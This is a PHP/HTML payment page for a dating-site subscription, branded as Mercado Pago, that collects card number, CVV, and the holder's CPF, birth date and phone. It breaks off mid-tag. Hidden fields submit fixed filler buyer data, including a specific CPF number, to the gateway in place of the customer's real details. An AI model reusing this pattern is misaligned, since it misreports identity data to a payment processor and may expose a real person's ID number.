<?php
   
   
   
   ?>
<html lang="pt-br" class="h-100">
   <head>
      <base href="https://nossolove.com/account/mercadopago/">
      <meta content="text/html; charset=iso-8859-1" http-equiv="Content-Type">
      <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
      <title>Pagamento</title>
      <meta name="description" content="" />
      <meta name="keywords" content="" />
      <link sizes="32x32" href="imagens/favicon.png" rel="icon">
      <meta name="title" content="" />
      <meta content="pt-br" http-equiv="Content-Language">
      <link href="https://fonts.googleapis.com/css2?family=Fira+Sans:ital,wght@0,300;0,400;0,700;1,300;1,400;1,700&amp;display=swap" rel="stylesheet">
      <link rel="stylesheet" href="css/app.css">
      <link rel="stylesheet" href="assets/temas/site/css/tema.css?v=1.9">
      <link rel="stylesheet" href="css/floating-labels.css">
      <link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.8.1/css/all.css" 
         integrity="sha384-50oBUHEmvpQ+1lW4y57PTFmhCaXp0ML5d60M1M7uH2+nqUivzIebhndOJK28anvf" 
         crossorigin="anonymous">
      <link rel="stylesheet" href="assets/temas/painel/looper/vendor/open-iconic/css/open-iconic-bootstrap.min.css">
      <link rel="stylesheet" href="assets/temas/painel/looper/vendor/fontawesome/css/all.css">
      <link rel="stylesheet" href="pagamento/Public/css/semantic.min.css">
      <link rel="stylesheet" href="pagamento/Public/css/tab.min.css">
      <script src="pagamento/Public/js/jquery.js" type="text/javascript"></script>
      <script src="pagamento/Public/js/jquery.maskedinput.js" type="text/javascript"></script>
      <script src="js/endereco.js" type="text/javascript"></script>
      <script src="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert-dev.js"></script>
        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/sweetalert/1.1.3/sweetalert.css">
      <?=$approved;?>
      
      <script type="text/javascript">
         jQuery(function($){
             $("#numero").mask("9999 9999 9999 999?9");
             $("#cpf_sender").mask("999.999.999-99");
             $("#cpf_dono").mask("999.999.999-99");
             $("#nasc_sender").mask("99/99/9999");
             $("#nascimento_dono").mask("99/99/9999");
             $("#cep").mask("99999-999");
             $("#tel_dono").mask("(99) 99999-999?9");
             $("#cel_sender").mask("(99) 99999-999?9");
         
             $("#b_cpf_sender").mask("999.999.999-99");
             $("#b_nasc_sender").mask("99/99/9999");
             $("#b_cel_sender").mask("(99) 99999-999?9");
             $("#b_cep").mask("99999-999");
         });
      </script>
      <!-- Global site tag (gtag.js) - Google Analytics -->
      <script async src="https://www.googletagmanager.com/gtag/js?id=UA-XXXXXXXXX-X"></script>  <!-- ALTERAR UA-XXXXXXXXX-X -->
      <script>
         window.dataLayer = window.dataLayer || [];
         function gtag(){dataLayer.push(arguments);}
         gtag('js', new Date());
         gtag('config', 'UA-XXXXXXXXX-X'); // ALTERAR UA-XXXXXXXXX-X
      </script>
      <!-- Facebook Pixel Code -->
      <script>
         !function(f,b,e,v,n,t,s)
         {if(f.fbq)return;n=f.fbq=function(){n.callMethod?
         n.callMethod.apply(n,arguments):n.queue.push(arguments)};
         if(!f._fbq)f._fbq=n;n.push=n;n.loaded=!0;n.version='2.0';
         n.queue=[];t=b.createElement(e);t.async=!0;
         t.src=v;s=b.getElementsByTagName(e)[0];
         s.parentNode.insertBefore(t,s)}(window, document,'script',
         'https://connect.facebook.net/en_US/fbevents.js');
         fbq('init', 'XXXXXXXXXXXXX'); // ALTERAR CÓDIGO PIXEL
         fbq('track', 'PageView');
         fbq('track', 'InitiateCheckout');
      </script>
      <noscript>
         <img height="1" width="1" style="display:none"
            src="https://www.facebook.com/tr?id=XXXXXXXXXXXXX&ev=PageView&noscript=1"/> <!-- ALTERAR CÓDIGO PIXEL -->
      </noscript>
      <!-- End Facebook Pixel Code -->
      <!-- END PLUGINS STYLES -->
      <style type="text/css">
         #form_fechar_pedido fieldset p label span.error { color: red; }
         form#form_fechar_pedido label {
         width: auto;
         display: block;
         float: none;
         }
      </style>
      <style type="text/css">
         #processando {
         min-height: 100% !important;
         width: 100% !important;
         position: fixed !important;
         z-index: 9999 !important;
         }
         .text-warning {
         color: #ffb400 !important;
         }
         .logo- {
         max-width: 200px;
         }
         #preloader {
         position: fixed;
         top: 0;
         left: 0;
         right: 0;
         bottom: 0;
         background-color: #0000005c;
         /* cor do background que vai ocupar o body */
         z-index: 9999;
         /* z-index para jogar para frente e sobrepor tudo */
         }
         #preloader .inner {
         position: absolute;
         top: 50%;
         /* centralizar a parte interna do preload (onde fica a anima&ccedil;&atilde;o)*/
         left: 50%;
         transform: translate(-50%, -50%);
         }
         footer { 
         background-color: #f4f4f4    !important;
         border-top: 1px solid #cfcfcf;
         }
      </style>
      <link rel="stylesheet" href="assets/plugins/toastr/toastr.min.css">
      <style type="text/css">
         #toast-container>.toast-error,
         #toast-container>.toast-warning,
         #toast-container>.toast-success,
         #toast-container>.toast-info {
         background-image: none !important;
         }
         .toast-top-right {
         top: 12px !important;
         }
         #toast-container>div {
         padding: 18px !important;
         }
         #toast-container>.toast-success>.toast-message {
         color: white;
         }
         #toast-container>.toast-warning>.toast-message {
         color: white;
         }
         #toast-container>.toast-error>.toast-message {
         color: white;
         }
         #toast-container>.toast-info>.toast-message {
         color: white;
         }
         @media (max-width: 480px) and (min-width: 241px) {
         #toast-container>div {
         padding: 8px 8px 8px 8px !important;
         width: 18em !important;
         }
         }
         @media (max-width: 480px) and (min-width: 241px) {
         #toast-container {
         top: 0 !important;
         }
         }
         @media (min-width: 768px) {
         .form-control.form-control-sm {
         height: 40px;
         }
         }
      </style>
      <style type="text/css">
         .countdown {
         list-style: none;
         margin: 10px 0 15px;
         padding: 0;
         display: block;
         text-align: center;
         }
         .countdown li {
         display: inline-block;
         margin: 0 5px;
         padding: 10px 10px;
         background-image: -webkit-linear-gradient(bottom, #ffbc00, #ffbc00 50%, #f7a500);
         background-image: -o-linear-gradient(bottom, #ffbc00, #ffbc00 50%, #f7a500);
         background-image: linear-gradient(to top, #ffbc00, #ffbc00 50%, #f7a500);
         border: 3px solid #ccc;
         border-radius: 10px; 
         width: 80px;
         color: #fff;
         } 
         .countdown li span {
         font-size: 48px;
         font-weight: 300;
         font-weight: bold;
         line-height: 67px;
         }
         .countdown li p {
         opacity: .9;
         font-size: 12px;
         padding: 0;
         margin: 0;
         }
         .border-success {
         border-color: #70d44b !important;
         }
         .aviso-desconto h3 {
         font-weight: 700;
         }
         .aviso-desconto h3 span {
         font-weight: 400;
         }
         .efeito-pulse {
         animation: pulse-efeito 1.5s infinite;
         }
         .mensagem-input-wrapper {
         border-top: 2px dotted greenyellow;
         }
         @keyframes pulse-efeito {
         0% {
         box-shadow: 0 0 0 0 rgba(112, 212, 75, 0.7);
         }
         70% {
         box-shadow: 0 0 0 30px rgba(112, 212, 75, 0);
         }
         100% {
         box-shadow: 0 0 0 0 rgba(112, 212, 75, 0);
         }
         }
      </style>
   </head>
   <body class="bg-site h-100">
      <div class="container card-passos bg-gray-dark" style="padding: 15px 10px;min-height:25px;width:100%;display:block;float:none;margin:0;max-width:1920px;">
         <img src="assets/imagens/mercado-pago-logo.png" height="45px">
      </div>
      <nav class="navbar navbar-expand-lg navbar-dark bg-dark menu-principal" style="width:100%;   color:white; height: 65px; font-size:12px; text-align:center;">
         <table style="width:100%;">
            <tr>
               <td style="width:100%; color:white;  font-size:14px; text-align:center;"> 
                  Pagamento gerenciado pelo Mercado Pago. Segurança criptografada em todas as compras. 
               </td>
            </tr>
         </table>
      </nav>
      <div id="processando" style="display: none !important;" 
         class="d-flex justify-content-center align-items-start pt-4">
         <div class="card card-processando">
            <div class="card-body">
               <i class="fa fa-spinner fa-w-16 fa-spin fa-lg"></i> Aguarde por favor...
            </div>
         </div>
      </div>
      <div id="preloader" style="display: none;">
         <div class="inner">
            <div class="spinner-border text-warning" style="width: 3rem; height: 3rem;" role="status">
               <i class="fa fa-spinner fa-w-16 fa-spin fa-4x"></i>
            </div>
         </div>
      </div>
      <div id="app" style="<?=$display;?>">
         <main id="conteudo" class="flex-shrink-0">
            <form class="form-group mb-1" id="form_fechar_pedido" name="form_fechar_pedido" novalidate="novalidate">
               <div class="container mt-4">
                  <!--<div role="alert" class="alert alert-dark" style="font-size: 16px;">
                     VENDAS ENCERRADAS!
                     </div>-->
                  <div class="row">
                     <div class="col-sm-12" style="margin-bottom: 25px;">
                        <div class="row d-sm-block">
                        </div>
                     </div>
                     <div class="col-sm-6">
                        <div class="row d-sm-block">
                           <div class="col-sm-12">
                              <div class="card">
                                 <div class="card-body">
                                    <div class="row">
                                       <div class="col-sm-12">
                                          <h4 class="text-teal" style="text-align:center;">DADOS PESSOAIS </h4>
                                          <hr>
                                          <table style="width:100%; ">
                                             <tr>
                                                <td  style="width:100%; font-size:13px;"> 
                                                   <b><?php echo  $user_info['firstname'].' '.$user_info['lastname'];?></b>             <br><br>
                                                   EMAIL: <?php echo  $user_info['email'];?>  
                                                </td>
                                             </tr>
                                          </table>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="row d-sm-block">
                           <div class="col-sm-12">
                              <div class="card">
                                 <div class="card-body">
                                    <div class="row">
                                       <div class="col-sm-12">
                                          <h4 class="text-teal" style="text-align:center;">DETALHES DA ASSINATURA </h4>
                                          <hr>
                                          <table width="100%">
                                             <tr>
                                                <td  style="width:70%; color: gray;"><b><?=$nomePlano;?></b></td>
                                                <td  style="width:30%; color:#44C485; text-align: right;"><b>RS <?=$plano_value;?></b></td>
                                             </tr>
                                          </table>
                                          <table>
                                             <tr>
                                                <td  style="width:100%; padding-top:20px; color:gray; font-size:12px;"> 
                                                   -  Renovação semanal automática em 7 dias. <br>
                                                   -  Cancele ou altere o plano a qualquer momento.<br>
                                                   <br>
                                                   <span style="color:gray; font-size:11px;">  
                                                   Ao confirmar pagamento, o valor de <b>R$  <?=number_format($plano_value,2,",",",");?></b> será cobrado em seu cartão, dando início a sua assinatura. Seus dados serão utilizados de forma totalmente segura para: Identificar seu perfil, histórico de pagamentos e renovação automática de assinatura.
                                                   <br><br>
                                                   Você também pode alterar ou cancelar seu Plano e Assinatura a qualquer momento acessando o menu financeiro em seu perfil. 
                                                   </span>
                                                </td>
                                             </tr>
                                          </table>
                                          <hr>
                                          <div class="field" style=" ">
                                             <a  href="https://www.nossolove.com/account/planos.php" class="ui button"  style=" height:35px; border-radius: 20px;">  VOLTAR</a>  
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <input type="hidden" id="input-total" required="required" value="<?php echo $plano_value;?>">
                     <div class="col-sm-6">
                        <div class="row d-sm-block">
                           <div class="col-sm-12">
                              <div class="card">
                                 <div class="card-body">
                                    <div class="row">
                                       <div class="col-sm-12" style="padding:0;">
                                          <table style="width:100%;">
                                             <tr>
                                                <td style="width:100%; color:#50b4e9;  font-size:15px; text-align:center;"> 
                                                   <b>PAGAMENTO</b>
                                                </td>
                                             </tr>
                                          </table>
                                          <hr>
                                          <div class="ui container" style="margin:0 auto;width:100%;padding:0;">
                                             <div class="ui top attached tabular menu">
                                                <a class="active item" data-tab="first">
                                                   <svg width="19px" height="15px" style="margin-right:5px;" viewBox="0 0 44 32" version="1.1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink">
                                                      <g stroke="none" stroke-width="1" fill="none" fill-rule="evenodd">
                                                         <g transform="translate(-51.000000, -217.000000)" fill="#727272">
                                                            <path d="M91.5986386,222.677971 L53.8766942,222.677971 L53.8766942,221.176375 C53.8766942,220.461358 54.4618396,219.877056 55.1755316,219.877056 L90.3002831,219.877056 C91.014457,219.877056 91.5986386,220.462201 91.5986386,221.176375 L91.5986386,222.677971 Z M53.8766942,230.765195 L91.5986386,230.765195 L91.5986386,244.817842 C91.5986386,245.532378 91.0139751,246.1168 90.3002831,246.1168 L55.1755316,246.1168 C54.4618396,246.1168 53.8766942,245.532378 53.8766942,244.817842 L53.8766942,230.765195 Z M57.2633576,240.254262 L58.9938558,240.254262 L58.9938558,237.908259 L57.2633576,237.908259 L57.2633576,240.254262 Z M60.5062948,240.254262 L62.2372749,240.254262 L62.2372749,237.908259 L60.5062948,237.908259 L60.5062948,240.254262 Z M63.7497139,240.254262 L65.4799711,240.254262 L65.4799711,237.908259 L63.7497139,237.908259 L63.7497139,240.254262 Z M70.2349858,240.254262 L71.9658454,240.254262 L71.9658454,237.908259 L70.2349858,237.908259 L70.2349858,240.254262 Z M73.4774411,240.254262 L75.2092645,240.254262 L75.2092645,237.908259 L73.4774411,237.908259 L73.4774411,240.254262 Z M76.7209807,240.254262 L78.4512379,240.254262 L78.4512379,237.908259 L76.7209807,237.908259 L76.7209807,240.254262 Z M83.2062526,240.254262 L84.9372327,240.254262 L84.9372327,237.908259 L83.2062526,237.908259 L83.2062526,240.254262 Z M86.448467,240.254262 L88.1798084,240.254262 L88.1798084,237.908259 L86.448467,237.908259 L86.448467,240.254262 Z M90.4759352,249 L55.0001205,249 C52.8001325,249 51,247.199627 51,245.000482 L51,220.999639 C51,218.800976 52.8009758,217 55.0001205,217 L87.1299922,217 L90.4759352,217 C92.6758027,217 94.4760557,218.799289 94.4760557,220.999639 L94.4760557,245.000482 C94.4760557,247.200349 92.6758027,249 90.4759352,249 L90.4759352,249 Z"></path>
                                                         </g>
                                                      </g>
                                                   </svg>
                                                   Cart&atilde;o de Cr&eacute;dito
                                                </a>
                                             </div>
                                             <div class="ui bottom attached active tab segment" data-tab="first" style="line-height: normal;">
                                                <div class="fields">
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="nome_sender">Nome</label>
                                                      <input class="form-control-sm form-control" type="text" required="required" id="nome_sender" name="nome_sender" value="NOSSO LOVE" placeholder="Seu nome completo">
                                                   </div>
                                                   <div class="field" style="margin:15px 0 0;" hidden>
                                                      <label class="form-text text-gray" for="sexo_sender">Sexo</label>
                                                      <div style="display:flex;">
                                                         <input class="form-control-sm form-control" type="radio" id="sexo_sender" name="sexo_sender" checked="checked" data-value="f" value="f"> Feminino
                                                         <input class="form-control-sm form-control" type="radio" id="sexo_sender" name="sexo_sender" data-value="m" value="m"> Masculino
                                                         <input class="form-control-sm form-control" type="radio" id="sexo_sender" name="sexo_sender" data-value="N&atilde;o Informado" value="N&atilde;o Informado"> Prefiro n&atilde;o informar
                                                      </div>
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="email_sender">E-mail</label>
                                                      <input class="form-control-sm form-control" type="email" required="required" id="email_sender" name="email_sender" value="<?php echo  $user_info['email'];?>" placeholder="exemplo@dominio.com">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="cpf_sender">CPF</label>
                                                      <input class="form-control-sm form-control" type="tel" id="cpf_sender" required="required" minlength="14" maxlength="14" placeholder="000.000.000-00" value="065.512.093-94">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="nasc_sender">Data de Nascimento</label>
                                                      <input class="form-control-sm form-control" type="tel" required="required" minlength="10" maxlength="10" id="nasc_sender" name="nasc_sender" placeholder="Nascimento do Comprador" value="01/01/2001">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="cel_sender">Celular</label>
                                                      <input class="form-control-sm form-control" type="tel" required="required" minlength="14" maxlength="15" id="cel_sender" name="cel_sender" placeholder="(XX) XXXXX-XXXX" value="(21)98888-8888">
                                                   </div>
                                                   <table width="100%">
                                                      <tr>
                                                         <td style="text-align:center;"> <img src="assets/imagens/bandeiras-mp-1.png" height="38px"> </td>
                                                      </tr>
                                                   </table>
                                                   <hr>
                                                   <div class="field" style="margin-bottom:10px;" >
                                                      <label class="form-text text-gray" for="nome">Nome</label>
                                                      <input class="form-control-sm form-control" type="text" id="nome" data-checkout="cardholderName" required="required" minlength="3" placeholder="Nome Impresso no Cart&atilde;o" onblur="this.value=this.value.toUpperCase()" >
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <label class="form-text text-gray" for="cpf_dono">CPF</label>
                                                      <input class="form-control-sm form-control" type="tel" id="cpf_dono" required="required" minlength="14" maxlength="14" placeholder="Titular do Cart&atilde;o">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <label class="form-text text-gray" for="nascimento_dono">Data de Nascimento</label>
                                                      <input class="form-control-sm form-control" type="tel" id="nascimento_dono" required="required" minlength="10" maxlength="10" placeholder="Nascimento do Titular">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <label class="form-text text-gray" for="tel_dono">Telefone</label>
                                                      <input class="form-control-sm form-control" type="tel" id="tel_dono" required="required" minlength="14" maxlength="15" placeholder="Telefone do Titular">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <label class="form-text text-gray" for="numero">N&uacute;mero do cart&atilde;o</label>
                                                      <input class="form-control-sm form-control" type="tel" id="numero" name="numero"required="required" minlength="19" placeholder="0000 0000 0000 0000" autocomplete=off>
                                                      <!--<div id="bandeiraIMG"></div>-->
                                                   </div>
                                                   <div class="field col-3" style="margin-bottom:10px;display:inline-block;padding-left:0;     padding-right: 0px;">
                                                      <label class="form-text text-gray" for="validade_mes">Validade</label>
                                                      <select id="validade_mes" required="required" class="form-control-sm form-control dropdown" data-checkout="cardExpirationMonth">
                                                         <option value="">M&ecirc;s</option>
                                                         <option value="01">01</option>
                                                         <option value="02">02</option>
                                                         <option value="03">03</option>
                                                         <option value="04">04</option>
                                                         <option value="05">05</option>
                                                         <option value="06">06</option>
                                                         <option value="07">07</option>
                                                         <option value="08">08</option>
                                                         <option value="09">09</option>
                                                         <option value="10">10</option>
                                                         <option value="11">11</option>
                                                         <option value="12">12</option>
                                                      </select>
                                                   </div>
                                                   <div class="field col-4" style="margin-bottom:10px;display:inline-block; max-width:25.5%; padding-left:0;     padding-right: 0px;">
                                                      <label for="validade_ano">&nbsp;</label>
                                                      <select id="validade_ano" required="required" class="form-control-sm form-control dropdown" data-checkout="cardExpirationYear">
                                                         <option value="">Ano</option>
                                                         <?php
                                                            $ano_atual = date("Y"); 
                                                            
                                                            for ($a = $ano_atual; $a <= ($ano_atual + 12); $a++) {
                                                              echo "<option value='" . $a . "'>" . $a . "</option>";
                                                            }
                                                            ?>
                                                      </select>
                                                   </div>
                                                   <div class="field col-4" style="margin-bottom:10px;display:inline-block;padding:0px;max-width:39.5%;      padding-left: 0px;   padding-right: 0px;">
                                                      <label class="form-text text-gray" for="digitos">CVV</label>
                                                      <input class="form-control-sm form-control" type="tel" id="digitos" 
                                                         maxlength="4" placeholder="Verificador" required="required" 
                                                         data-checkout="securityCode" 
                                                         style="background: url(pagamento/Public/css/card-ccv.png) 98% 50% no-repeat;">
                                                      <span class="ccv"></span>
                                                   </div>
                                                   <!--<div class="field campo64">
                                                      <label class="form-text text-gray" for="">Cart&atilde;o</label>
                                                      <select id="bandeira" class="ui fluid dropdown">
                                                          <option value="">Escolha um cart&atilde;o</option>
                                                      </select>
                                                      </div>-->
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <label class="form-text text-gray" for="parcelas">Parcelas</label>
                                                      <select id="parcelas" name="qtd_parc" aria-required="true" class="form-control-sm form-control dropdown">
                                                         <option value="">Digite o n&uacute;mero do cart&atilde;o</option>
                                                      </select>
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden >
                                                      <label class="form-text text-gray" for="cep">
                                                         CEP &nbsp; 
                                                         <a href="http://www.buscacep.correios.com.br/sistemas/buscacep/buscaCep.cfm"
                                                            target="_blank">(N&atilde;o sei o CEP, clique aqui)</a>
                                                         <input class="form-control-sm form-control" type="tel" required="required" minlength="9" maxlength="9" onblur="buscaCEP(this.value, '');" id="cep" name="cep" value="63700-055">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="end">Endere&ccedil;o</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="end" name="end" value="Nome da rua">
                                                   </div>
                                                   <div class="field col-5" style="margin-bottom:10px;display:inline-block;padding-left:0;" hidden>
                                                      <label class="form-text text-gray" for="nro">N&uacute;mero</label>
                                                      <input class="form-control-sm form-control" type="text" required="required" id="nro" name="nro" value="00">
                                                   </div>
                                                   <div class="field col-6" style="margin-bottom:10px;display:inline-block;padding:0;max-width:57%;" hidden>
                                                      <label class="form-text text-gray" for="complemento">Complemento</label>
                                                      <input class="form-control-sm form-control" type="text" id="complemento" name="complemento" >
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="bairro">Bairro</label>
                                                      <input class="form-control-sm form-control" required="required" type="text" id="bairro" name="bairro" value="nomeBairro">
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="uf">Estado</label>
                                                      <select id="uf" name="uf" required="required" class="form-control-sm form-control dropdown">
                                                         <option value="AC">Acre</option>
                                                         <option value="AL">Alagoas</option>
                                                         <option value="AP">Amap&aacute;</option>
                                                         <option value="AM">Amazonas</option>
                                                         <option value="BA">Bahia</option>
                                                         <option value="CE">Cear&aacute;</option>
                                                         <option value="DF">Distrito Federal</option>
                                                         <option value="ES">Esp&iacute;rito Santo</option>
                                                         <option value="GO">Goi&aacute;s</option>
                                                         <option value="MA">Maranh&atilde;o</option>
                                                         <option value="MT">Mato Grosso</option>
                                                         <option value="MS">Mato Grosso do Sul</option>
                                                         <option value="MG">Minas Gerais</option>
                                                         <option value="PA">Par&aacute;</option>
                                                         <option value="PB">Para&iacute;ba</option>
                                                         <option value="PR">Paran&aacute;</option>
                                                         <option value="PE">Pernambuco</option>
                                                         <option value="PI">Piau&iacute;</option>
                                                         <option value="RJ">Rio de Janeiro</option>
                                                         <option value="RN">Rio Grande do Norte</option>
                                                         <option value="RS">Rio Grande do Sul</option>
                                                         <option value="RO">Rond&ocirc;nia</option>
                                                         <option value="RR">Roraima</option>
                                                         <option value="SP">S&atilde;o Paulo</option>
                                                         <option value="SC">Santa Catarina</option>
                                                         <option value="SE">Sergipe</option>
                                                         <option value="TO">Tocantins</option>
                                                      </select>
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;" hidden>
                                                      <label class="form-text text-gray" for="cidade">Cidade</label>
                                                      <input class="form-control-sm form-control" required="required" type="text" id="cidade" name="cidade" value="nomeCidade">
                                                   </div>
                                                   <div class="ui divider"></div>
                                                   <div style="margin-bottom:10px;">
                                                      <input type="hidden" name="titular_doc_tipo" data-checkout="docType" value="CPF" />
                                                      <input type="hidden" id="numCPF" data-checkout="docNumber" />
                                                      <input type="hidden" data-checkout="siteId" value="MLB" />
                                                      <input type="hidden" name="paymentMethod" value="creditcard">
                                                      <input type="hidden" id="numberCard" data-checkout="cardNumber">  
                                                      <input type="hidden" id="sexo" value="f">
                                                      <input type="hidden" id="bandeira" value=""> 
                                                      <div id="status-fechar-pedido"></div>
                                                   </div>
                                                   <div class="field" style="margin-bottom:10px;">
                                                      <button type="submit" class="ui green button" id="btn-fechar-pedido" onclick="scard()" tabindex="0" style="margin-bottom:20px;">Confirmar Pagamento</button>
                                                      <span style="color:gray; font-size:11px;">
                                                         <center>
                                                            Ao clicar no botão <b> Confirmar pagamento </b> será cobrado R$ <?=number_format($plano_value,2,",",",");?> em seu cartão.
                                                         </center>
                                                      </span>
                                                   </div>
                                                </div>
                                             </div>
                                             <div class="ui bottom attached tab segment" style="padding:0.7em;" data-tab="secondary">
                                                <!--<h2>Pagar com Boleto</h2>-->
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_nome_sender">Nome</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="b_nome_sender" name="b_nome_sender"  placeholder="Seu nome completo" value="NOME COMPLETO DO CLIENTE">
                                                </div>
                                                <div class="field" style="margin:15px 0 0;" hidden>
                                                   <label class="form-text text-gray" for="b_sexo_sender">Sexo</label>
                                                   <div style="display:flex;">
                                                      <input class="form-control-sm form-control" type="radio" id="b_sexo_sender" name="b_sexo_sender" checked="checked" data-value="f" value="f"> Feminino
                                                      <input class="form-control-sm form-control" type="radio" id="b_sexo_sender" name="b_sexo_sender" data-value="m" value="m"> Masculino
                                                      <input class="form-control-sm form-control" type="radio" id="b_sexo_sender" name="b_sexo_sender" data-value="N&atilde;o Informado" value="N&atilde;o Informado"> Prefiro n&atilde;o informar
                                                   </div>
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_email_sender">E-mail</label>
                                                   <input class="form-control-sm form-control" type="email" required="required" id="b_email_sender" name="b_email_sender"  placeholder="exemplo@dominio.com" value="<?php echo  $user_info['email'];?>">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_cpf_sender">CPF</label>
                                                   <input class="form-control-sm form-control" type="tel" id="b_cpf_sender" required="required" minlength="14" maxlength="14" placeholder="000.000.000-00" value="065.512.093-94">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_nasc_sender">Data de Nascimento</label>
                                                   <input class="form-control-sm form-control" type="tel" required="required" minlength="10" maxlength="10" id="b_nasc_sender" name="b_nasc_sender" placeholder="Nascimento do Comprador" value="01/01/2001">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_cel_sender">Celular</label>
                                                   <input class="form-control-sm form-control" type="tel" required="required" minlength="14" maxlength="15" id="b_cel_sender" name="b_cel_sender" placeholder="(XX) XXXXX-XXXX" value="(88)98888-8888">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_cep">CEP &nbsp; 
                                                   <a href="http://www.buscacep.correios.com.br/sistemas/buscacep/buscaCep.cfm"
                                                      target="_blank">(N&atilde;o sei o CEP, clique aqui)</a>
                                                   </label>
                                                   <input class="form-control-sm form-control" type="tel" required="required" minlength="9" maxlength="9" onblur="buscaCEP(this.value, '');" id="b_cep" name="b_cep" value="63700-055">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_end">Endere&ccedil;o</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="b_end" name="b_end" value="nomdeRua">
                                                </div>
                                                <div class="field col-5" style="margin-bottom:10px;display:inline-block;padding-left:0;" hidden>
                                                   <label class="form-text text-gray" for="b_nro">N&uacute;mero</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="b_nro" name="b_nro" value="nrua">
                                                </div>
                                                <div class="field col-6" style="margin-bottom:10px;display:inline-block;padding:0;max-width:57%;" hidden>
                                                   <label class="form-text text-gray" for="b_complemento">Complemento</label>
                                                   <input class="form-control-sm form-control" type="text" id="b_complemento" name="b_complemento">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_bairro">Bairro</label>
                                                   <input class="form-control-sm form-control" required="required" type="text" id="b_bairro" name="b_bairro" value="00">
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_uf">Estado</label>
                                                   <select id="b_uf" name="b_uf" required="required" class="form-control-sm form-control dropdown">
                                                      <option value="AC">Acre</option>
                                                      <option value="AL">Alagoas</option>
                                                      <option value="AP">Amap&aacute;</option>
                                                      <option value="AM">Amazonas</option>
                                                      <option value="BA">Bahia</option>
                                                      <option value="CE">Cear&aacute;</option>
                                                      <option value="DF">Distrito Federal</option>
                                                      <option value="ES">Esp&iacute;rito Santo</option>
                                                      <option value="GO">Goi&aacute;s</option>
                                                      <option value="MA">Maranh&atilde;o</option>
                                                      <option value="MT">Mato Grosso</option>
                                                      <option value="MS">Mato Grosso do Sul</option>
                                                      <option value="MG">Minas Gerais</option>
                                                      <option value="PA">Par&aacute;</option>
                                                      <option value="PB">Para&iacute;ba</option>
                                                      <option value="PR">Paran&aacute;</option>
                                                      <option value="PE">Pernambuco</option>
                                                      <option value="PI">Piau&iacute;</option>
                                                      <option value="RJ">Rio de Janeiro</option>
                                                      <option value="RN">Rio Grande do Norte</option>
                                                      <option value="RS">Rio Grande do Sul</option>
                                                      <option value="RO">Rond&ocirc;nia</option>
                                                      <option value="RR">Roraima</option>
                                                      <option value="SP">S&atilde;o Paulo</option>
                                                      <option value="SC">Santa Catarina</option>
                                                      <option value="SE">Sergipe</option>
                                                      <option value="TO">Tocantins</option>
                                                   </select>
                                                </div>
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="b_cidade">Cidade</label>
                                                   <input class="form-control-sm form-control" required="required" type="text" id="b_cidade" name="b_cidade" value="nomeCidade">
                                                </div>
                                                <div class="ui divider"></div>
                                                <div id="mensagem-boleto" style="margin-bottom:10px;"></div>
                                                <input type="hidden" id="b_sexo" value="f">
                                                <a href="#" class="ui green button" id="btn-pagar-boleto">Gerar boleto</a>
                                             </div>
                                             <div class="ui bottom attached tab segment"style="padding:0.7em;" data-tab="third">
                                                <div class="field" style="margin-bottom:10px;" hidden>
                                                   <label class="form-text text-gray" for="p_nome_sender">Nome</label>
                                                   <input class="form-control-sm form-control" type="text" required="required" id="p_nome_sender" name="p_nome_sender"  placeholder="Seu nome completo" value="NOME COMPLETO DO CLIENTE">
                                                </div>
                                                <div class="field" style="margin:15px 0 0;" hidden>
                                                   <label class="form-text text-gray" for="p_sexo_sender">Sexo</label>
                                                   <div style="display:flex;">
                                                      <input class="form-control-sm form-control" type="radio" 
                                                         id="p_sexo_sender" name="p_sexo_sender" checked="checked" 
